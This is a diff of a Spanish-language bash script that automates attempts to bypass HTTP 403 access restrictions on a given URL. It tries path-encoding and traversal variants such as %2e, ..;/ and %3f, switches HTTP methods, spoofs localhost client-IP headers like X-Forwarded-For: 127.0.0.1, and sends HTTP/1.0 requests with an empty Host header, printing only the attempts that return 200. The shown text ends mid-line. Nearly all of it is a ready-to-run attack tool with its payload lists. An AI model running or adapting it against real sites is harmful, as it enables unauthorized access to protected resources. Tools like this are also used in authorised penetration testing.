@@ -1,146 +1,156 @@
-#!/bin/sh
-# 403-bypass-show-params.sh
-# Muestra URL completa + método + cabeceras usadas en cada prueba
+#!/bin/bash
+# 403bypass5-mejorado.sh
+# Muestra SOLO casos 200 OK + imprime la petición curl completa con -v
+# Permite pasar la URL completa de una vez
 #
-# Uso:  ./403-bypass-show-params.sh https://hackingyseguridad.com /admin/
-#       ./403-bypass-show-params.sh https://ejemplo.com /panel
+# Uso:
+#   ./403bypass5.sh https://target.com/ruta/protegida/
+#   ./403bypass5.sh https://ejemplo.com/admin
 
-if [ $# -lt 2 ]; then
-    echo "Uso: $0 <base_url> <path>"
+if [ $# -ne 1 ]; then
+    echo "Uso: $0 <URL_COMPLETA>"
     echo "Ejemplos:"
-    echo "  $0 https://hackingyseguridad.com /admin/"
-    echo "  $0 https://target.com admin"
+    echo "  $0 https://target.com/admin/"
+    echo "  $0 https://ejemplo.com/panel"
     exit 1
 fi
 
-BASEURL="$1"
-PATH_INPUT="$2"
+FULL_TARGET="$1"
 
-# Limpiamos el path (quitamos / inicial y final)
-PATH_INPUT="${PATH_INPUT#/}"
-PATH_INPUT="${PATH_INPUT%/}"
-TARGET_PATH="$PATH_INPUT"
+# Quitamos posible / final para normalizar
+FULL_TARGET="${FULL_TARGET%/}"
 
 echo ""
 echo "============================================================="
-echo " Pruebas de bypass 403 → ${BASEURL}/${TARGET_PATH}/"
+echo " Pruebas de bypass 403 → $FULL_TARGET/"
+echo " (solo se muestran respuestas 200 OK)"
 echo "============================================================="
 echo ""
 
 # ────────────────────────────────────────────────
-#  Payloads de path (relativos)
+#  Payloads de path (relativos al final de la URL base)
 # ────────────────────────────────────────────────
-
 payloads() {
     cat << 'EOF'
-${TARGET_PATH}/
-${TARGET_PATH}//
-${TARGET_PATH}/.
-${TARGET_PATH}/../${TARGET_PATH}/
-${TARGET_PATH}/%2e/
-${TARGET_PATH}/%2e%2e/${TARGET_PATH}/
-${TARGET_PATH}/.;/
-${TARGET_PATH}/..;/
-${TARGET_PATH}%20/
-${TARGET_PATH}%09/
-${TARGET_PATH}?
-${TARGET_PATH}%3f
-${TARGET_PATH}%23
-${TARGET_PATH}/*
-${TARGET_PATH}/.random
-${TARGET_PATH}/index.aspx
-${TARGET_PATH}/default.aspx
+/
+//
+/.
+/../${LAST_DIR}/
+/%2e/
+/%2e%2e/${LAST_DIR}/
+/.;/
+/..;/
+/%20/
+/%09/
+/?
+/%3f
+/%23
+/*
+/.random
+/index.aspx
+/default.aspx
 EOF
 }
 
+# Extraemos el "último directorio" para algunos payloads relativos
+LAST_DIR=$(basename "$FULL_TARGET")
+
 # ────────────────────────────────────────────────
-#  Métodos HTTP a probar
+#  Métodos a probar
 # ────────────────────────────────────────────────
 METHODS="GET HEAD OPTIONS POST"
 
 # ────────────────────────────────────────────────
-#  Cabeceras especiales (una por línea)
+#  Cabeceras especiales
 # ────────────────────────────────────────────────
 special_headers() {
     cat << 'EOF'
 X-Forwarded-For: 127.0.0.1
 X-Forwarded-For: localhost
+X-Forwarded-For: 127.0.0.1:80
 X-Forwarded-For: ::1
 X-Real-IP: 127.0.0.1
 X-Remote-Addr: 127.0.0.1
-X-Forwarded-Host: localhost
 Client-IP: 127.0.0.1
+X-Forwarded-Host: localhost
 Forwarded: for=127.0.0.1;proto=https;by=localhost
 EOF
 }
 
 # ────────────────────────────────────────────────
-#  1. Pruebas variando path + método (sin cabeceras extra)
+#  Función auxiliar: ejecuta curl y muestra solo si es 200
 # ────────────────────────────────────────────────
+run_curl() {
+    local cmd="$1"
+    echo "$cmd"
+    echo "--------------------------------------------------"
+    
+    # Ejecutamos con -v para ver el request completo
+    # -s para no mostrar barra de progreso
+    # -m 8 timeout
+    # -w para capturar el código de estado
+    output=$(eval "$cmd -s -k -m 8 -v -o /dev/null -w '%{http_code}'" 2>&1)
+    
+    http_code=$(echo "$output" | tail -n1)
+    
+    if [[ "$http_code" == "200" ]]; then
+        echo "$output" | grep -v "^{" | grep -v "^}" | grep -v "^* "
+        echo ""
+        echo ">>> ÉXITO 200 OK DETECTADO <<<"
+        echo "--------------------------------------------------"
+        echo ""
+    fi
+}
 
-echo "[*] 1. Variaciones de PATH + cambio de método (sin cabeceras especiales)"
+# ────────────────────────────────────────────────
+#  1. Variaciones de path + distintos métodos
+# ────────────────────────────────────────────────
+echo "[*] 1. Variaciones de PATH + cambio de método"
 echo "-------------------------------------------------------------"
 
 for payload in $(payloads); do
-    full_url="${BASEURL}/${payload}"
+    test_url="${FULL_TARGET}${payload}"
+    
     for method in $METHODS; do
-        echo "URL     : $full_url"
-        echo "Método  : $method"
-        echo "Headers : (ninguno especial)"
-        echo "--------------------------------------------------"
-        curl -sk -m 7 -I -X "$method" "$full_url" 2>/dev/null | head -n 1
-        echo ""
+        cmd="curl -X $method -I \"$test_url\""
+        run_curl "$cmd"
     done
 done
 
 # ────────────────────────────────────────────────
-#  2. Pruebas con cabeceras de proxy/localhost (solo GET)
+#  2. Cabeceras de spoofing (solo GET por ahora)
 # ────────────────────────────────────────────────
-
-echo "[*] 2. Cabeceras de proxy / localhost spoofing (solo GET)"
+echo ""
+echo "[*] 2. Cabeceras de proxy / localhost spoofing (GET)"
 echo "-------------------------------------------------------------"
 
 for header in $(special_headers); do
-    for extra in "" "//" "/." "/..;/" "/.;/"; do
-        full_url="${BASEURL}/${TARGET_PATH}${extra}"
-        echo "URL     : $full_url"
-        echo "Método  : GET"
-        echo "Header  : $header"
-        echo "--------------------------------------------------"
-        curl -sk -m 7 -I -X GET -H "$header" "$full_url" 2>/dev/null | head -n 1
-        echo ""
+    for extra in "" "/" "//" "/." "/..;/" "/.;/" "/ "; do
+        test_url="${FULL_TARGET}${extra}"
+        cmd="curl -X GET -I -H \"$header\" \"$test_url\""
+        run_curl "$cmd"
     done
 done
 
 # ────────────────────────────────────────────────
-#  3. Trucos de HTTP/1.0 + Host vacío (clásicos en IIS antiguos)
+#  3. Trucos clásicos HTTP/1.0 + Host vacío
 # ────────────────────────────────────────────────
-
+echo ""
 echo "[*] 3. Trucos HTTP/1.0 + Host header vacío"
 echo "-------------------------------------------------------------"
 
-full_url="${BASEURL}/${TARGET_PATH}/"
+test_url="${FULL_TARGET}/"
 
-echo "URL     : $full_url"
-echo "Método  : GET"
-echo "Versión : HTTP/1.0  (sin --http1.0 explícito)"
-echo "Headers : (ninguno especial)"
-echo "--------------------------------------------------"
-curl -sk -m 7 -I "$full_url" 2>/dev/null | head -n 1
-echo ""
+# Normal
+cmd="curl -I \"$test_url\""
+run_curl "$cmd"
 
-echo "URL     : $full_url"
-echo "Método  : GET"
-echo "Versión : HTTP/1.0"
-echo "Headers : Host: (vacío)"
-echo "--------------------------------------------------"
-curl -sk -m 7 -I --http1.0 -H "Host:" "$full_url" 2>/dev/null | head -n 1
-echo ""
+# HTTP/1.0 sin Host
+cmd="curl --http1.0 -I \"$test_url\""
+run_curl "$cmd"
 
-echo ""
-echo "============================================================="
-echo " Finalizadas las pruebas básicas"
-echo " Busca respuestas 200 / 301 / 302 / 401 / 403 con cuerpos distintos"
-echo " Si ves algo interesante → repite manualmente con Burp / navegador"
-echo "============================================================="
-echo ""
+# HTTP/1.0 + Host vacío
+cmd="curl --http1.0 -I -H \"Host:\" \"$test_url\""
+run_curl "$cmd"
+
+echo 
